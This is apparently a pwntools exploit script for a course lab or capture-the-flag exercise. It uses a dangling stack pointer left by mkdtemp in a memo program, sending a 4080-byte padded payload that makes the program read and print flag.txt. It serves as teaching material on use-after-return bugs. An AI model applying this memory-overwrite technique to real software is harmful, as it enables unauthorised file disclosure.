#!/usr/bin/env python3
"""
Lab 7 - Exercise 1 exploit (Memory Salad / Memorial Cabbage variant)

Goal:
  Use the bug in ex1.c to print the contents of ./flag.txt.

Binary summary (from ex1.c):
  - setup():
      * Creates a temp directory with mkdtemp("/tmp/cabbage.XXXXXX").
      * mkdtemp modifies a STACK buffer 'template[]' in-place and returns
        a pointer to it, which is stored in the global variable 'tempdir'.
        After setup() returns, 'tempdir' points to DEAD stack memory.
  - memo_w():
      * Has a big stack buffer: char buf[0x1000].
      * Reads up to 4094 bytes from stdin via fgets(buf, 0xfff, stdin).
      * Later does:
            strcpy(path, tempdir);
            strcpy(path + strlen(TEMPDIR_TEMPLATE), "/memo.txt");
  - memo_r():
      * Uses the same 'tempdir' to build a path and fopen(..., "r"), then
        prints "Memo: <file contents>".

Key bug:
  The address that 'tempdir' points to (the old 'template[]' in setup())
  gets reused as part of the 'buf' array in memo_w(). That means when we
  write into buf with fgets, we can overwrite the bytes that 'tempdir'
  points to, i.e. overwrite the directory name string that mkdtemp made.

If we overwrite those bytes with "flag.txt\\0", then 'tempdir' becomes a
pointer to the string "flag.txt". The later fopen() in memo_r() will
open "./flag.txt" and print its contents.

Offset:
  GDB (or the CTF write-ups) shows that the address of 'tempdir' (i.e.
  the reused 'template' buffer) is 4080 bytes after the start of buf.
  So:

      buf[0:4080]      -> junk
      buf[4080:4088]   -> "flag.txt"
      buf[4088]        -> '\\0'  (string terminator)

  fgets will happily read these bytes, and the null byte becomes part of
  the buffer contents (fgets stops only on newline/EOF, not on 0x00).
  Later, 'tempdir' points to that region, so C-string functions see
  exactly "flag.txt\\0".

Exploit steps:
  1. Choose menu option 1 (Write memo).
  2. Send a payload = b"A"*4080 + b"flag.txt" + b"\\x00".
     This overwrites the memory that 'tempdir' points to.
  3. 'memo_w()' then tries to open "flag.txt" for writing. On a typical
     CTF setup, this fails due to permissions, but the in-memory string
     remains changed.
  4. Choose menu option 2 (Read memo).
     'memo_r()' builds a path using 'tempdir', which is now "flag.txt",
     and fopen("flag.txt", "r") reads ./flag.txt.
  5. The program prints: "Memo: <flag>".

You should see something like:
  Memo: osds{congrats_you_flagged_it!}
from the provided flag.txt. :contentReference[oaicite:4]{index=4}
"""

from pwn import *

# Adjust this if your binary has a different name or path.
BIN_PATH = "./bin/ex1"

# pwntools setup: this lets you use ELF info, and disables noisy checksec output.
context.binary = ELF(BIN_PATH, checksec=False)
context.log_level = "info"  # change to "debug" while debugging


def start():
    """
    Start the target process (locally by default).

    You can also support a remote service by doing:
      if args.REMOTE:
          return remote("host", port)
    """
    if args.REMOTE:
        # Example remote usage; update with the real host/port if needed.
        return remote("example.com", 9001)
    else:
        return process(BIN_PATH)


def main():
    # Start the process (or remote).
    io = start()

    # -----------------------------
    # 1) Overwrite tempdir string
    # -----------------------------
    #
    # Offset from start of buf[] in memo_w() to the address used by tempdir:
    #   4080 bytes (found with GDB / from write-ups for this exact binary).
    #
    # We want to place "flag.txt\x00" right where tempdir points, so that
    # tempdir is effectively a pointer to the C-string "flag.txt".
    #
    offset_to_tempdir = 4080

    # Path string to overwrite into tempdir's storage.
    # For the lab, README says ./flag.txt, so just "flag.txt" is enough.
    # If your container uses /flag.txt at root, change this to b"/flag.txt".
    flag_path = b"flag.txt"

    # Build payload:
    #   - 'A' * 4080 : fills the buffer up to the position where the old
    #                  mkdtemp() string lived.
    #   - flag_path  : overwrite the bytes that tempdir points to with
    #                  "flag.txt".
    #   - b"\x00"    : C-string terminator so that later strcpy() sees the
    #                  string as exactly "flag.txt".
    payload = b"A" * offset_to_tempdir + flag_path + b"\x00"

    log.info(f"Payload length: {len(payload)} bytes")

    # Choose "1. Write memo"
    io.sendlineafter(b"> ", b"1")

    # Send our crafted payload as the memo text.
    # fgets() in memo_w() will read this into buf and overwrite tempdir's string.
    io.sendlineafter(b"Memo: ", payload)

    # At this point:
    #   tempdir -> "flag.txt"
    # The attempt to fopen("flag.txt", "w") may fail due to permissions,
    # but tempdir still contains our overwritten string.

    # -----------------------------
    # 2) Trigger read to leak flag
    # -----------------------------
    #
    # Now we call memo_r():
    #   - It builds a path using tempdir ("flag.txt") and then opens it in "r".
    #   - Then it prints "Memo: <contents>".
    #
    io.sendlineafter(b"> ", b"2")

    # Read one line that starts with "Memo: ".
    line = io.recvline()
    print(line.decode(errors="ignore"), end="")

    # If you want to keep the session open (e.g., to see more output), uncomment:
    # io.interactive()


if __name__ == "__main__":
    main()

